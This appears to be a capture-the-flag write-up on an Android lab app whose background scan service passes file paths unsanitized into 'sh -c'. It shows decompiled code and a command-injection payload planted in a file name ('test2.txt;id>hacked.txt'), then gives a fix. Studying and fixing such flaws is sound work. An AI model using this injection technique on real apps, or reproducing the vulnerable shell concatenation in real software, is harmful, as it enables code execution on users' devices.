### Objective

Exploit a vulnerability inherent within an Android service to achieve remote code execution.

### Steps

- When the app launches, it displays a single toggle switch labeled **"Enable Scanner"**. Enabling it shows: *"Scan service started, your device will be scanned regularly"* and forces the switch back ON. No other UI interaction exists, so the next step is static analysis.
    
    ![image.png](/img/m1.png)
    
- Decompiled the APK using JADX and started with `AndroidManifest.xml`:  we can see
    
```xml
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    
    <activity
        android:name="com.mobilehackinglab.cyclicscanner.MainActivity"
        android:exported="true"/>
    
    <service
        android:name="com.mobilehackinglab.cyclicscanner.scanner.ScanService"
        android:exported="false"/>
```
    
    - Only one activity: `MainActivity`
    - `ScanService` is **not exported** can't be triggered directly via `adb`
    - `MANAGE_EXTERNAL_STORAGE` → full access to `/storage/emulated/0`

---

- Moved to `MainActivity` to understand the switch behavior. Analyzed `setupSwitch$lambda$3()`:
    
```java
    public static final void setupSwitch$lambda$3(MainActivity this$0, CompoundButton compoundButton, boolean isChecked) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
```

    This confirms what we saw in the UI, switch ON launches `ScanService` as a foreground service, and switch OFF just forces it back ON via `activityMainBinding.serviceSwitch.setChecked(true);`, making it impossible to stop the service manually. Before showing the switch at all, `handlePermissions()` checks for `MANAGE_EXTERNAL_STORAGE`  if not granted it redirects to settings, if granted it shows the switch.

---

- Since `ScanService` is the core of the app, opened it next and analyzed `handleMessage()` inside `ServiceHandler`:
    
```java
    File externalStorageDirectory = Environment.getExternalStorageDirectory();
    Sequence files = FilesKt.walk(externalStorageDirectory);
    
    for (Object element : files) {
        File file = (File) element;
        if (file.canRead() && file.isFile()) {
            boolean safe = ScanEngine.INSTANCE.scanFile(file);
            System.out.println(safe ? "SAFE" : "INFECTED");
        }
    }
    
    sendMessageDelayed(nextMessage, SCAN_INTERVAL); // reschedule every 6000ms
```
    
    - Walks **all files** recursively under `/storage/emulated/0` ,Then Every file gets passed to `ScanEngine.scanFile()` The service runs on a dedicated `HandlerThread` separate from the main thread so the scan loop runs in the background every 6 seconds without freezing the UI.

---

- This pointed directly to `ScanEngine` as the next class to investigate.
    
```java
    String command = "toybox sha1sum " + file.getAbsolutePath();
    Process process = new ProcessBuilder()
        .command("sh", "-c", command)
        .directory(Environment.getExternalStorageDirectory())
        .redirectErrorStream(true)
        .start();
    
    String output = reader.readLine();
    Object fileHash = StringsKt.substringBefore(output, "  ");
    return !KNOWN_MALWARE_SAMPLES.containsValue(fileHash);
```
    
    Breaking down what this method does step by step:
    
    1. **Builds a shell command** by taking the file's absolute path and concatenating it directly into a `toybox sha1sum` command string. `toybox` is a collection of Unix utilities built into Android — here it's used to calculate the SHA1 hash of the file: 
        **`toybox sha1sum /storage/emulated/0/Download/test.txt`**
    
    2. **Executes it via `ProcessBuilder`** using `sh -c` meaning the entire string is handed to the shell to interpret and run. Critically, this is done without any sanitization on the filename before it gets passed to the shell making it vulnerable to command injection.
    3. **Reads the output, extracts the hash, then compares it** against `KNOWN_MALWARE_SAMPLES` if the hash isn't in the list the file is marked `SAFE`, if it matches it's marked `INFECTED`.

---

- To confirm the scan service is working, created a test file in the scanned directory and watched logcat:
    
```bash
    emu64x:/sdcard/Download # echo "test" > test.txt
```
    
- Within 6 seconds the service picked it up and logged it as `SAFE` confirming that any file placed in external storage gets scanned automatically.

---

- With that confirmed, the next step is placing a file with a malicious name. Instead of normal content, the injection is in the **filename itself**
    
```bash
    echo "test" > "/sdcard/Download/test2.txt;id>hacked.txt"
```
    
- After 6 seconds, `hacked.txt` appears in the same directory containing the output of `id`  **RCE confirmed**.
    
    ![image.png](/img/m3.png)

<aside>
💡The root cause is unsanitized input passed to `sh -c` because the filename goes through the shell, any `;` in it gets interpreted as a command separator. The fix is to drop `sh -c` entirely and pass the arguments directly to `toybox` via `ProcessBuilder`, so the filename is never interpreted by a shell and is treated as a literal argument:

```java
// vulnerable — full string handed to sh, which interprets ; as a command separator
new ProcessBuilder()
    .command("sh", "-c", "toybox sha1sum " + file.getAbsolutePath())

// safe — arguments passed directly to toybox, no shell involved, ; is just a character
new ProcessBuilder()
    .command("toybox", "sha1sum", file.getAbsolutePath())
```

</aside>
